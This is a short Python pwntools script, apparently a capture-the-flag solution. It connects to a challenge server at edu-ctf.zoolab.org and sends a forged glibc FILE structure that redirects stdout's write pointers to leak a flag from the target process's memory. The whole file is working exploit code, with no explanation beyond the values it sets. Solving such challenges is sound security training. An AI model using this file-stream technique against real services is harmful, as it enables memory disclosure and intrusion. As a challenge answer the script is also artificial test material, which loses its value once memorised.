from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 10010)

flags = 0xfbad0800
flag_addr = 0x404050

file_no = 0x1
read_ptr = 0
read_end = flag_addr
read_base = 0
write_base = flag_addr
write_ptr = flag_addr + 0x10
write_end = 0
buf_base = 0
buf_end = 0
_chain = 0x00007ffff7f9d6a0

garbage = b'A'*8

payload = flat(
    garbage, garbage,
    garbage, garbage,
    flags, read_ptr,
    read_end, read_base,
    write_base, write_ptr,
    write_end, buf_base,
    buf_end, garbage,
    garbage, garbage,
    garbage, _chain,
    file_no
)

r.send(payload)
print(r.recvall())

# FLAG{QAQ...}